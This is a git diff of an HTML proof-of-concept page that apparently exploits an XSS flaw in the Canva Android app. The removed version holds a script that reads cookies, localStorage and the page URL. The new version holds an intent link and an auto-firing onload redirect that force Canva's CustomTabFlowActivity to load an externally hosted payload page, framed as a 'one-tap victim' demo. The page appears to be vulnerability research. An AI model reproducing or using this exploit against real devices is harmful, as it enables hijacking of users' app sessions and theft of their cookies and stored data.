@@ -1,17 +1,19 @@
 <!DOCTYPE html>
 <html>
-<script>alert("XSS Confirmed")</script>
-<script>
-var cookies = document.cookie;
-var storage = JSON.stringify(localStorage);
-var url = document.location.href;
+<head><title>Canva WebView XSS - Remote Trigger PoC</title></head>
+<body>
+  <h2>Canva CustomTabFlowActivity — Remote Exploit Trigger</h2>
+  <p>Tap the link below (on an Android device with Canva installed):</p>
 
-// Display everything on screen as proof
-document.write("<h2>Canva WebView XSS PoC</h2>");
-document.write("<b>Domain:</b> " + document.domain + "<br>");
-document.write("<b>Cookies:</b> " + (cookies || "none") + "<br>");
-document.write("<b>URL:</b> " + url + "<br>");
-document.write("<b>LocalStorage:</b> " + storage + "<br>");
-document.write("<b>UserAgent:</b> " + navigator.userAgent + "<br>");
-</script>
+  <a href="intent:#Intent;component=com.canva.editor/com.canva.browserflow.feature.CustomTabFlowActivity;S.BROWSER_FLOW_URL=https%3A%2F%2Fans-a-cyber.github.io%2FPortfolio%2Fpoc.html;end">
+    Click here to trigger XSS in Canva
+  </a>
+
+  <script>
+    // Optional: auto-fire on page load for a fuller "one-tap victim" demo
+    window.onload = function() {
+      window.location = "intent:#Intent;component=com.canva.editor/com.canva.browserflow.feature.CustomTabFlowActivity;S.BROWSER_FLOW_URL=https%3A%2F%2Fans-a-cyber.github.io%2FPortfolio%2Fpoc.html;end";
+    };
+  </script>
+</body>
 </html>
